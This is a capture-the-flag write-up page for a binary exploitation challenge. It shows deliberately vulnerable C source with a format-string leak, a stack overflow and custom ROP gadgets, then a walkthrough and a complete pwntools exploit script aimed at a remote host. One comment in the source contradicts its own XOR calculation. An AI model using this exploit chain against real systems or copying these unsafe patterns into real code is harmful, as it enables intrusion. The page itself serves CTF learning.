@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CS_12.6 // Rogue_Net</title>
+    <meta name="description" content="## CS 12.06 - SYSTEM 2.0 ## Description XIIVI ONCE SAID &#34;IINEK DIMA AL HOLILA&#34;">
+    <link rel="stylesheet" href="../../../../static/css/style.css">
+</head>
+<body>
+    <!-- Genjutsu Transition Overlay -->
+    <div class="genjutsu-overlay initial-closed" id="genjutsuOverlay">
+        <div class="eyelid eyelid-top"></div>
+        <div class="eyelid eyelid-bottom"></div>
+        <div class="genjutsu-eye">
+                <svg viewBox="0 0 200 200">
+                    <circle cx="100" cy="100" r="94" fill="var(--blood-red)" stroke="#000" stroke-width="10"/>
+                    <!-- Base 3-Tomoe -->
+                    <g class="base-sharingan" style="transform-origin: 100px 100px;">
+                        <circle cx="100" cy="100" r="90" fill="var(--blood-red)"/>
+                        <circle cx="100" cy="100" r="16" fill="#000"/>
+                        <circle cx="100" cy="100" r="55" fill="none" stroke="#000" stroke-width="2" stroke-dasharray="8 6"/>
+                        <g class="tomoe"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(120deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                        <g class="tomoe" style="transform-origin: 100px 100px; transform: rotate(240deg);"><path d="M100,45 Q125,55 100,100" fill="none" stroke="#000" stroke-width="12" stroke-linecap="round"/></g>
+                    </g>
+                    <!-- Uploaded Image Mangekyo -->
+                    <defs>
+                        <clipPath id="circleClip">
+                            <circle cx="100" cy="100" r="98" />
+                        </clipPath>
+                    </defs>
+                    <image href="../../../../static/img/mangekyou.png" x="0" y="0" height="200" width="200" class="mangekyo" style="transform-origin: 100px 100px; opacity: 0; clip-path: url(#circleClip);" />
+                </svg>
+        </div>
+    </div>
+    <div class="scanlines"></div>
+    <div class="scroll-indicator" id="scrollIndicator"></div>
+    <div class="scroll-addr" id="scrollAddr">0x00000000</div>
+    <div class="pwndbg-bg" id="pwndbgBg"></div>
+
+    <div class="container" style="gap: 40px;">
+
+        <a href="../../../../index.html" class="back-link">← pwndbg> back</a>
+
+        <div class="chall-header">
+            <h1><span class="prefix">./</span>CS_12.6<span class="cursor-blink">_</span></h1>
+            <div class="chall-meta-row">
+                <span class="tag">PWN</span>
+                <span>MOJO-JOJO CTF</span>
+                <span>0xf80a2f7b</span>
+                
+                
+                <span>
+                    <span class="difficulty">
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot filled"></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                        <span class="diff-dot "></span>
+                        
+                    </span>
+                </span>
+            </div>
+        </div>
+
+        <!-- Description -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DESCRIPTION</div>
+            <div class="code-block">
+                ## CS 12.06 - SYSTEM 2.0 ## Description XIIVI ONCE SAID &#34;IINEK DIMA AL HOLILA&#34;
+            </div>
+        </div>
+
+        
+        <!-- Source Code / Disasm -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">DISASM // SOURCE</div>
+            
+            <div style="color: var(--amber); margin-bottom: 8px; font-size: 0.9rem;">// challenge.c</div>
+            <div class="code-block" style="max-height: 500px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+#include &lt;fcntl.h&gt;
+
+volatile void (*_k_dispatch_table)(long, long, long) __attribute__((used));
+
+void _sys_maintenance(long a, long b, long c) {
+    // Dynamic filename encryption to prevent direct jump bypass
+    char f[] = &#34;gm`f/uyu&#34;; // &#34;flag.txt&#34; XOR 1
+    // Wait, let&#39;s re-calculate:
+    // f (0x66) ^ 1 = 0x67 (g)
+    // l (0x6c) ^ 1 = 0x6d (m)
+    // a (0x61) ^ 1 = 0x60 (`)
+    // g (0x67) ^ 1 = 0x66 (f)
+    // . (0x2e) ^ 1 = 0x2f (/)
+    // t (0x74) ^ 1 = 0x75 (u)
+    // x (0x78) ^ 1 = 0x79 (y)
+    // t (0x74) ^ 1 = 0x75 (u)
+    // Correct string: &#34;gm`f/yuy&#34;
+
+    if (a != 0x1206 || b != 0x1161 || c != 0xcafebab) {
+        printf(&#34;\x1b[31m[CRITICAL]\x1b[0m Unauthorized neural override detected. Vectors misaligned.\n&#34;);
+        fflush(stdout);
+        return;
+    }
+    
+    printf(&#34;\n\x1b[32m[SYSTEM]\x1b[0m Quantum Vector Alignment Confirmed.\n&#34;);
+    printf(&#34;\x1b[32m[SYSTEM]\x1b[0m Bypassing security kernels... Initiating Core Dump...\n\n&#34;);
+    fflush(stdout);
+    
+    // Decrypt filename using arguments. If jumping, f remains wrong.
+    for(int i=0; i&lt;8; i++) f[i] ^= (unsigned char)((a ^ b ^ c ^ 0xcafe8cc ^ 1) &amp; 0xFF);
+
+    int fd = open(f, O_RDONLY);
+    if (fd &lt; 0) {
+        write(1, &#34;[ERROR] Flag sector not found.\n&#34;, 31);
+        exit(1);
+    }
+    
+    char flag[128];
+    int n = read(fd, flag, sizeof(flag));
+    if (n &gt; 0) {
+        write(1, &#34;\x1b[33m&gt;&gt;&gt; DATA EXFILTRATED:\x1b[0m &#34;, 30);
+        write(1, flag, n);
+        write(1, &#34;\n&#34;, 1);
+    }
+    close(fd);
+    
+    printf(&#34;\n\x1b[32m[SYSTEM]\x1b[0m Session terminated safely.\n&#34;);
+    fflush(stdout);
+    sleep(1);
+    exit(0);
+}
+
+void init() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+}
+
+// Manual gadgets 
+__attribute__((naked)) void _proc_ctx() {
+    __asm__(
+        &#34;.global _proc_ctx_1\n&#34;
+        &#34;_proc_ctx_1:\n&#34;
+        &#34;pop %rbx\n&#34;
+        &#34;pop %rbp\n&#34;
+        &#34;pop %r12\n&#34;
+        &#34;pop %r13\n&#34;
+        &#34;mov (%rsp), %r14\n&#34;
+        &#34;add $8, %rsp\n&#34;
+        &#34;mov (%rsp), %r15\n&#34;
+        &#34;add $8, %rsp\n&#34;
+        &#34;ret\n&#34;
+        &#34;nop\n&#34;
+        &#34;nop\n&#34;
+        &#34;.global _proc_ctx_2\n&#34;
+        &#34;_proc_ctx_2:\n&#34;
+        &#34;mov %r14, %rdx\n&#34;
+        &#34;mov %r13, %rsi\n&#34;
+        &#34;mov %r12d, %edi\n&#34;
+        &#34;xor $0x1337, %rbx\n&#34;
+        &#34;call *(%r15,%rbx,8)\n&#34;
+        &#34;ret\n&#34;
+    );
+}
+
+void _log_handler() {
+    // Shifting offsets: Add dummy variables to push canary and return address further down the stack
+    long dummy[8] = {0xdeadbeef, 0xcafebabe, 0x13371337, 0x41414141};
+    char buffer[20];
+    
+    printf(&#34;\n[LOG] Initializing secure logging sequence...\n&#34;);
+    printf(&#34;[LOG] Identity verification required: &#34;);
+    
+    // Vulnerability: Format String (Leads to Canary/PIE leak)
+    // Limited buffer forces multiple leaks or clever tricks
+    if (fgets(buffer, sizeof(buffer), stdin) != NULL) {
+        printf(&#34;[LOG] Identity confirmed: &#34;);
+        printf(buffer); 
+    }
+}
+
+void _auth_guard() {
+    char secure_phrase[32];
+    printf(&#34;\n[GATE] Physical authentication barrier active.\n&#34;);
+    printf(&#34;[GATE] Provide phrase: &#34;);
+    
+    read(0, secure_phrase, 256); 
+    
+    printf(&#34;[GATE] Authentication failed. Terminating session.\n&#34;);
+}
+
+int main() {
+    init();
+    _k_dispatch_table = _sys_maintenance;
+    
+    printf(&#34;--- CS 12.06 ---\n&#34;);
+    printf(&#34;Security Level: MAXIMUM\n&#34;);
+    
+    _log_handler();
+    _auth_guard();
+    
+    printf(&#34;[SYSTEM] System shutdown.\n&#34;);
+    return 0;
+}
+</pre>
+            </div>
+            
+        </div>
+        
+
+        
+        <!-- Writeup -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">WRITEUP // WALKTHROUGH</div>
+            <div class="writeup-content">
+                <h1>CS 12.6 — Writeup</h1>
+<h2>Challenge Overview</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>PWN</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Insane</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td>r3t0x</td>
+</tr>
+<tr>
+<td><strong>Technique</strong></td>
+<td>Format String + Canary Leak + ROP via Custom Gadgets</td>
+</tr>
+</tbody>
+</table>
+<h2>Reconnaissance</h2>
+<div class="codehilite"><pre><span></span><code>pwndbg&gt;<span class="w"> </span>checksec<span class="w"> </span>./challenge
+<span class="w">    </span>Arch:<span class="w">     </span>amd64-64-little
+<span class="w">    </span>RELRO:<span class="w">    </span>Partial<span class="w"> </span>RELRO
+<span class="w">    </span>Stack:<span class="w">    </span>Canary<span class="w"> </span>found
+<span class="w">    </span>NX:<span class="w">       </span>NX<span class="w"> </span>enabled
+<span class="w">    </span>PIE:<span class="w">      </span>PIE<span class="w"> </span>enabled
+</code></pre></div>
+
+<p><strong>Full protections enabled</strong> — canary, NX, and PIE. This is a multi-stage exploit.</p>
+<h2>Vulnerability Chain</h2>
+<h3>Step 1: Format String Leak (in <code>_log_handler</code>)</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="w">  </span><span class="c1">// format string vulnerability!</span>
+</code></pre></div>
+
+<p>We leak the <strong>stack canary</strong> at offset <code>%17$p</code> and the <strong>PIE base</strong> at offset <code>%19$p</code>:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;required: &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;%17$p.%19$p&quot;</span><span class="p">)</span>
+<span class="c1"># Canary: 0x... PIE return addr: 0x...</span>
+</code></pre></div>
+
+<h3>Step 2: Buffer Overflow (in <code>_auth_guard</code>)</h3>
+<div class="codehilite"><pre><span></span><code><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">secure_phrase</span><span class="p">,</span><span class="w"> </span><span class="mi">256</span><span class="p">);</span><span class="w">  </span><span class="c1">// 256 bytes into 32-byte buffer</span>
+</code></pre></div>
+
+<p>With the canary leaked, we can overflow and <strong>restore the canary</strong> to bypass the check.</p>
+<h3>Step 3: ROP via Custom Gadgets</h3>
+<p>The binary contains hand-crafted gadgets in <code>_proc_ctx</code>:
+- <strong>gadget1</strong> (<code>_proc_ctx_1</code>): <code>pop rbx; pop rbp; pop r12; pop r13; mov r14,[rsp]; mov r15,[rsp+8]; ret</code>
+- <strong>gadget2</strong> (<code>_proc_ctx_2</code>): <code>mov rdx,r14; mov rsi,r13; mov edi,r12d; xor rbx,0x1337; call *[r15+rbx*8]</code></p>
+<p>The trick: <code>_k_dispatch_table</code> is a function pointer to <code>_sys_maintenance</code>. We set <code>rbx = 0x1337</code> so <code>rbx ^ 0x1337 = 0</code>, indexing <code>[r15]</code> = <code>_k_dispatch_table</code>, which calls <code>_sys_maintenance(0x1206, 0x1161, 0xcafebab)</code> — the magic arguments that decrypt and read <code>flag.txt</code>.</p>
+<h2>Result</h2>
+<div class="codehilite"><pre><span></span><code>[+] Canary recovered: 0xa1b2c3d400000000
+[+] PIE Base found:   0x555555554000
+&gt;&gt;&gt; DATA EXFILTRATED: MOJO-JOJO{f0rm4t_str1ng_t0_r0p_ch41n}
+</code></pre></div>
+            </div>
+        </div>
+        
+
+        
+        <!-- Exploit / Solver -->
+        <div class="pwndbg-section">
+            <div class="pwndbg-title">EXECUTION // EXPLOIT</div>
+            <div style="color: var(--text-muted); margin-bottom: 10px; font-size: 0.85rem;">
+                <span style="color: var(--gdb-green);">$</span> python3 solve.py
+            </div>
+            <div class="code-block" style="max-height: 600px; overflow-y: auto;">
+                <pre style="margin: 0; padding: 0; background: none; border: none;">from pwn import *
+
+context.binary = b = ELF(&#39;./challenge&#39;, checksec=False)
+
+def get_io():
+    if args.REMOTE:
+        return remote(args.HOST or &#39;4.233.210.175&#39;, int(args.PORT or 9006))
+    return process(b.path)
+
+# Single connection for Leak + Exploit (Canary is process-specific)
+io = get_io()
+
+# Leak Canary (17) and PIE (19)
+io.sendlineafter(b&#34;required: &#34;, b&#34;%17$p.%19$p&#34;)
+io.recvuntil(b&#34;confirmed: &#34;)
+leaks = io.recvline().strip().decode().split(&#39;.&#39;)
+canary = int(leaks[0], 16)
+pie = int(leaks[1], 16)
+
+b.address = pie - 0x162c
+success(f&#34;Canary recovered: {hex(canary)}&#34;)
+success(f&#34;PIE Base found:   {hex(b.address)}&#34;)
+
+# Proceed to _auth_guard overflow in the same session
+payload = flat([
+    b&#34;A&#34;*40, canary, b&#34;B&#34;*8, 
+    b.address + 0x1498, # ret
+    b.address + 0x1482, # gadget 1 (_proc_ctx_1)
+    0x1337, 1, 0x1206, 0x1161, 0xcafebab, 
+    b.address + 0x40b0, # k_dispatch_table
+    b.address + 0x149b  # gadget 2 (_proc_ctx_2)
+])
+
+io.sendafter(b&#34;: &#34;, payload)
+print(io.recvall(timeout=5).decode(&#39;utf-8&#39;, &#39;replace&#39;))
+io.close()
+</pre>
+            </div>
+        </div>
+        
+
+        <div style="height: 80px;"></div>
+    </div>
+
+    <script src="../../../../static/js/main.js"></script>
+</body>
+</html>
